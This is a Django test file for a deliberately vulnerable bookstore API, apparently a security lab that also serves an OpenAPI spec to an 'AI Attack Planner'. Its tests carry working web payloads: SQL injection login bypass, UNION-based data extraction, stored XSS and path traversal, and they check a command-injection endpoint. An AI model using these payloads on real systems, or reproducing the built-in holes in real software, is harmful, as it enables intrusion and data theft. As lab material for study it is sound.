import json
from django.test import TestCase, Client
from django.contrib.auth.models import User
from books.models import Book, Category

class VulnerableAPITestCase(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_superuser(
            username="admin",
            email="admin@bookie.vn",
            password="admin_secret_password"
        )
        self.category = Category.objects.create(name="Cong Nghe")
        self.book = Book.objects.create(
            title="Lap Trinh Python Thuc Chien",
            author="Nguyen Van Cuong",
            price=150000,
            stock=50,
            category=self.category,
        )

    def test_01_sqli_login_auth_bypass(self):
        """Test SQL Injection Auth Bypass on vulnerable_login"""
        # Exploit payload: admin' --
        payload = {"username": "admin' --", "password": "arbitrary_wrong_password"}
        response = self.client.post(
            "/api/v1/vulnerable/auth/login/",
            data=json.dumps(payload),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data["status"], "success")
        self.assertEqual(data["user"]["username"], "admin")
        self.assertIn("token", data)

    def test_02_sqli_union_search(self):
        """Test SQL Injection UNION-based data extraction on vulnerable_search"""
        # Normal search
        resp_norm = self.client.get("/api/v1/vulnerable/books/search/?q=Python")
        self.assertEqual(resp_norm.status_code, 200)
        self.assertGreaterEqual(resp_norm.json()["count"], 1)

        # UNION-based attack payload
        payload = "' UNION SELECT 9999, 'EXPLOITED_TITLE', 'HACKER', 500000 --"
        resp_attack = self.client.get(f"/api/v1/vulnerable/books/search/?q={payload}")
        self.assertEqual(resp_attack.status_code, 200)
        results = resp_attack.json()["results"]
        # Injected row should be present
        injected = [r for r in results if r.get("title") == "EXPLOITED_TITLE"]
        self.assertTrue(len(injected) > 0)

    def test_03_xss_stored_and_reflected_reviews(self):
        """Test Stored & Reflected XSS on vulnerable_reviews"""
        xss_payload = "<script>alert('PBL6_STORED_XSS')</script>"
        post_resp = self.client.post(
            "/api/v1/vulnerable/reviews/",
            data=json.dumps({"book_id": self.book.id, "author": "Attacker", "comment": xss_payload}),
            content_type="application/json"
        )
        self.assertEqual(post_resp.status_code, 201)
        self.assertIn(xss_payload, post_resp.json()["review"]["comment"])

        get_resp = self.client.get(f"/api/v1/vulnerable/reviews/?book_id={self.book.id}")
        self.assertEqual(get_resp.status_code, 200)
        comments = [r["comment"] for r in get_resp.json()["reviews"]]
        self.assertIn(xss_payload, comments)

    def test_04_path_traversal_file_download(self):
        """Test Path Traversal / LFI on vulnerable_file_download"""
        # Attempt to read manage.py relative to media/
        response = self.client.get("/api/v1/vulnerable/files/download/?file=../manage.py")
        self.assertEqual(response.status_code, 200)
        self.assertIn("DJANGO_SETTINGS_MODULE", response.content.decode("utf-8"))

    def test_05_command_injection_ping(self):
        """Test Command Injection on vulnerable_admin_ping"""
        response = self.client.post(
            "/api/v1/vulnerable/admin/ping/",
            data=json.dumps({"host": "127.0.0.1"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn("output", response.json())

    def test_06_openapi_spec_and_docs(self):
        """Test OpenAPI 3.0 schema generation for AI Attack Planner"""
        resp_json = self.client.get("/api/v1/vulnerable/openapi.json")
        self.assertEqual(resp_json.status_code, 200)
        spec = resp_json.json()
        self.assertEqual(spec["openapi"], "3.0.3")
        self.assertIn("/api/v1/vulnerable/auth/login/", spec["paths"])
        self.assertIn("/api/v1/vulnerable/books/search/", spec["paths"])

        resp_ui = self.client.get("/api/v1/vulnerable/docs/")
        self.assertEqual(resp_ui.status_code, 200)
        self.assertIn("SwaggerUIBundle", resp_ui.content.decode("utf-8"))
